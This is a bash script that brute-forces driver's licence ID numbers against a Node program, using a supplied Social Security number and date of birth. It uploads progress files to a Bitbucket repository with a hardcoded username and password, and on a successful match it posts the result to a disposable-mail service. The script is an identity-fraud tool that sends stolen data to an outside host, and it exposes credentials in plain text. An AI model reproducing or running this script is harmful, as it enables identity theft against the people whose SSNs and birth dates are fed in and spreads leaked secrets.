#!/bin/bash

for (( c=1; c<=${count:-10000}; c++ ))
do
  markfile=${ssn}_${dlId:0:-6}.txt
  if [[ "${dlId}" == *000 ]]; then
    if [[ -f "$markfile" ]]; then
      if cat $markfile | grep ${dlId}; then
        echo "Skipping ${dlId}..."
        dlId=$((dlId+1000))
        continue
      fi
    fi
  fi
  
  output=$(node index ${dlId} ${dob} ${ssn})
  echo $output | grep Success && result=$output && break
  echo $output
  
  if [[ "${dlId}" == *999 ]]; then
    echo "${dlId:0:-3}000" >> $markfile
    curl -iS -u "swang362:FnuGrCOJRKKrxOEgC9Md" -X POST -k "https://api.bitbucket.org/2.0/repositories/swang362/sndl/downloads" -F "files=@${markfile}"
  fi
  
  dlId=$((dlId+1))
done

if [ ! -z "$result" ]; then
  curl -s -X POST "https://m.kuku.lu/f.php" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "h=3690c0ddc9" --data-urlencode "action=sendMail" --data-urlencode "data=$result"
  exit 1
fi
